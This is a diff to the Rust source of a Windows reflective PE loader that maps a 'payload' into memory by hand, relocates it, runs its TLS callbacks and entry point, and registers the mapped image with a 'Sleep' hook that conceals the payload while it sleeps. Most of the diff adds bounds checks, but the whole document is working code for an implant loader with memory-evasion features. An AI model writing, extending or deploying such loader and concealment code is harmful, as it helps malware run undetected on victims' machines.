@@ -14,8 +14,8 @@ use windows::Win32::System::Memory::{
 };
 use windows::Win32::System::SystemServices::{
     DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
-    IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
-    IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
+    IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW,
+    IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
 };
 use windows::Win32::System::Threading::GetCurrentProcess;
 
@@ -115,6 +115,13 @@ pub unsafe fn run_reflective(
 
     let image_base = allocate_image(nt)?;
     crate::tech_dbg!("reflective_loading", "image mapped at {image_base:p}");
+    // Record the mapped image for runtime hooks (the `Sleep` proxy conceals it
+    // while the payload sleeps). `SizeOfImage` covers every section; the record
+    // is taken before any step could erase the mapped headers.
+    crate::payload_region::set(
+        image_base as usize,
+        (*nt).OptionalHeader.SizeOfImage as usize,
+    );
     copy_headers(payload, image_base, nt)?;
     copy_sections(payload, image_base, nt)?;
     crate::tech_dbg!("reflective_loading", "headers and sections copied");
@@ -138,8 +145,9 @@ pub unsafe fn run_reflective(
         // The payload's `DLL_PROCESS_ATTACH` callbacks initialize its global
         // state, which is all this mapper can offer: it does not provision the
         // per-thread TLS a manually mapped image has no index for (see
-        // `run_tls_callbacks`).
-        run_tls_callbacks(image_base, nt);
+        // `run_tls_callbacks`). A malformed TLS directory fails the load here,
+        // before any payload code runs.
+        run_tls_callbacks(image_base, nt)?;
     }
     crate::tech_dbg!("reflective_loading", "TLS callbacks executed");
 
@@ -173,13 +181,31 @@ pub unsafe fn run_reflective(
         // callbacks, `DllMain`, `erase_mapped_header` and `resolve_export`.
         payload.fill(0);
         crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
-        let _handoff = crate::tls_handoff::PauseGuard::enter();
-        call_export(address);
+        {
+            let _handoff = crate::tls_handoff::PauseGuard::enter();
+            call_export(address);
+        }
+        // The payload is back: report the runtime hook's work on the loader's
+        // thread, where the debug stub's TLS is provisioned (the proxy itself
+        // must never trace).
+        crate::tech_dbg!(
+            "reflective_loading",
+            "sleep-hook conceals completed: {}",
+            crate::payload_region::conceals()
+        );
         return Ok(0);
     }
 
-    let _handoff = crate::tls_handoff::PauseGuard::enter();
-    execute_entrypoint(image_base, nt, is_dll)
+    let code = {
+        let _handoff = crate::tls_handoff::PauseGuard::enter();
+        execute_entrypoint(image_base, nt, is_dll)
+    };
+    crate::tech_dbg!(
+        "reflective_loading",
+        "sleep-hook conceals completed: {}",
+        crate::payload_region::conceals()
+    );
+    code
 }
 
 /// Validates the image and returns pointers to its DOS and NT headers.
@@ -420,13 +446,28 @@ fn fix_imports(
     Ok(())
 }
 
+/// Whether a relocation's fixup target stays inside the image.
+///
+/// The target is the block's page RVA plus the entry's offset, and the fixup
+/// writes `width` bytes there. Both the page RVA and the offset are payload
+/// controlled, so the sum has to be checked (and then bounded against
+/// `SizeOfImage`) before the mapper writes through it.
+fn reloc_target_in_image(page_rva: u32, offset: u16, width: usize, size_of_image: usize) -> bool {
+    (page_rva as usize)
+        .checked_add(offset as usize)
+        .and_then(|target| target.checked_add(width))
+        .map(|end| end <= size_of_image)
+        .unwrap_or(false)
+}
+
 /// Applies the image's base relocations when it did not land at its preferred
 /// base.
 ///
 /// Landing away from the preferred base is only fixable with relocations: without
 /// them every absolute address in the image still points at the preferred base,
 /// so the load fails here — with a diagnostic — instead of faulting later inside
-/// the payload.
+/// the payload. Every block header and every fixup target is checked against the
+/// directory and `SizeOfImage` before it is dereferenced or written.
 fn fix_relocations(
     image_base: *mut c_void,
     nt: *const NtHeaders,
@@ -444,29 +485,49 @@ fn fix_relocations(
             return Err($MSG_NO_RELOCATIONS$);
         }
 
-        // The walk below trusts the directory's own terminator, so the directory
-        // has to be inside the image before the first block is dereferenced.
+        // The directory has to be inside the image before the first block is
+        // dereferenced, and the walk below stops at `dir_end` as well as at a
+        // zero block: every header is checked before its fields are trusted.
         let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
-        let dir_end = (reloc_dir.VirtualAddress as usize)
+        let dir_start = reloc_dir.VirtualAddress as usize;
+        let header_size = std::mem::size_of::<IMAGE_BASE_RELOCATION>();
+        let dir_end = dir_start
             .checked_add(reloc_dir.Size as usize)
             .ok_or_else(|| $MSG_RELOCATIONS_OUT_OF_IMAGE$)?;
-        if dir_end > size_of_image {
+        // A directory too small to hold one block header cannot be walked; the
+        // image needs its relocations, so an empty table is not an option.
+        if dir_end > size_of_image || (reloc_dir.Size as usize) < header_size {
             return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
         }
-        let dir_limit = image_base as usize + dir_end;
-        let header_size = std::mem::size_of::<IMAGE_BASE_RELOCATION>();
+        let image_start = image_base as usize;
 
-        let mut block = (image_base as usize + reloc_dir.VirtualAddress as usize)
-            as *const IMAGE_BASE_RELOCATION;
-        while (*block).VirtualAddress != 0 {
+        let mut block_rva = dir_start;
+        loop {
+            // The block header is read before its fields are trusted, so it has
+            // to fit in the directory first. A directory that ends without a
+            // zero terminator is legal (the linker only has to stay within
+            // `Size`), so running out of room ends the walk instead of reading
+            // past the directory.
+            let Some(header_end) = block_rva.checked_add(header_size) else {
+                return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
+            };
+            if header_end > dir_end {
+                break;
+            }
+
+            let block = (image_start + block_rva) as *const IMAGE_BASE_RELOCATION;
+            let page_rva = (*block).VirtualAddress;
+            if page_rva == 0 {
+                break;
+            }
             let block_size = (*block).SizeOfBlock as usize;
             // A block that is too small to hold its own header would underflow
             // `count` below, and one that runs past the directory would read
             // whatever follows it.
-            let block_end = (block as usize)
+            let block_end = block_rva
                 .checked_add(block_size)
                 .ok_or_else(|| $MSG_RELOCATIONS_OUT_OF_IMAGE$)?;
-            if block_size < header_size || block_end > dir_limit {
+            if block_size < header_size || block_end > dir_end {
                 return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
             }
             let count = (block_size - header_size) / std::mem::size_of::<u16>();
@@ -474,12 +535,28 @@ fn fix_relocations(
 
             for i in 0..count {
                 let entry = entries.add(i);
-                let target = (image_base as usize
-                    + (*block).VirtualAddress as usize
-                    + (*entry).offset() as usize) as *mut isize;
+                let kind = (*entry).type_() as u32;
+                let offset = (*entry).offset();
+                // The width of the value a fixup writes; `ABSOLUTE` (and any
+                // type this mapper does not know) writes nothing and needs no
+                // target.
+                let width = match kind {
+                    IMAGE_REL_BASED_DIR64 => std::mem::size_of::<u64>(),
+                    IMAGE_REL_BASED_HIGHLOW => std::mem::size_of::<u32>(),
+                    IMAGE_REL_BASED_HIGH | IMAGE_REL_BASED_LOW => std::mem::size_of::<u16>(),
+                    _ => 0,
+                };
+                if width == 0 {
+                    continue;
+                }
+                // A page RVA near the end of the address space would otherwise
+                // write far outside the mapped image.
+                if !reloc_target_in_image(page_rva, offset, width, size_of_image) {
+                    return Err($MSG_RELOCATIONS_OUT_OF_IMAGE$);
+                }
 
-                match (*entry).type_() as u32 {
-                    IMAGE_REL_BASED_ABSOLUTE => {}
+                let target = (image_start + page_rva as usize + offset as usize) as *mut isize;
+                match kind {
                     IMAGE_REL_BASED_DIR64 => {
                         *target += delta;
                     }
@@ -499,7 +576,7 @@ fn fix_relocations(
                 }
             }
 
-            block = block_end as *const IMAGE_BASE_RELOCATION;
+            block_rva = block_end;
         }
     }
     Ok(())
@@ -557,8 +634,25 @@ fn fix_memory_protections(
 }
 
 
+/// Whether an `IMAGE_TLS_DIRECTORY` at `tls_rva` lies inside the image.
+///
+/// The mapper reads the directory's pointer fields from the mapped image, so the
+/// whole struct has to fit in `SizeOfImage` before the first read.
+fn tls_dir_in_image(tls_rva: u32, size_of_image: usize) -> bool {
+    (tls_rva as usize)
+        .checked_add(std::mem::size_of::<TlsDirectory>())
+        .map(|end| end <= size_of_image)
+        .unwrap_or(false)
+}
+
 /// Runs the payload's `DLL_PROCESS_ATTACH` TLS callbacks, the way the loader
 /// would, and nothing more.
+///
+/// The directory, the callback array and every callback address the walk reads
+/// are payload-controlled: each is checked against the mapped image before it is
+/// followed, and the walk stops at the first null or at the image end, so a
+/// malformed directory is an error instead of an out-of-bounds read or a call
+/// into arbitrary memory.
 ///
 /// A manually mapped image gets no TLS index: the OS never assigns one, so a
 /// payload whose CRT relies on `_tls_index` for per-thread state
@@ -583,26 +677,57 @@ fn fix_memory_protections(
 /// The callbacks a thread created afterwards would get are not run either: the
 /// loader does not know about the mapped image, so there is nothing to trigger
 /// `DLL_THREAD_ATTACH`.
-fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) {
+fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) -> Result<(), String> {
     unsafe {
         let tls_dir =
             (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
         if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
-            return;
+            return Ok(());
         }
 
-        let tls =
-            (image_base as usize + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
-        let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
-        if callbacks.is_null() {
-            return;
+        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
+        let image_start = image_base as usize;
+        let image_end = image_start
+            .checked_add(size_of_image)
+            .ok_or_else(|| $MSG_IMAGE_SIZE_INVALID$)?;
+        // Before the directory's fields are read.
+        if !tls_dir_in_image(tls_dir.VirtualAddress, size_of_image) {
+            return Err($MSG_IMAGE_SIZE_INVALID$);
         }
 
-        let mut i = 0usize;
-        while let Some(callback) = *callbacks.add(i) {
+        let tls = (image_start + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
+        // The relocation pass above fixed the directory's pointers, so this is
+        // a *mapped* address, not a preferred-base one.
+        let callbacks_va = (*tls).AddressOfCallBacks as usize;
+        if callbacks_va == 0 {
+            return Ok(());
+        }
+        if callbacks_va < image_start || callbacks_va >= image_end {
+            return Err($MSG_IMAGE_SIZE_INVALID$);
+        }
+
+        let slot_size = std::mem::size_of::<PIMAGE_TLS_CALLBACK>();
+        let mut slot = callbacks_va;
+        loop {
+            // Each slot is read only after it is known to fit: an unterminated
+            // array must not walk past the image.
+            let slot_end = slot
+                .checked_add(slot_size)
+                .ok_or_else(|| $MSG_IMAGE_SIZE_INVALID$)?;
+            if slot_end > image_end {
+                return Err($MSG_IMAGE_SIZE_INVALID$);
+            }
+            let Some(callback) = *(slot as *const PIMAGE_TLS_CALLBACK) else {
+                break;
+            };
+            let address = callback as usize;
+            if address < image_start || address >= image_end {
+                return Err($MSG_ENTRY_POINT_OUT_OF_BOUNDS$);
+            }
             callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
-            i += 1;
+            slot = slot_end;
         }
+        Ok(())
     }
 }
 
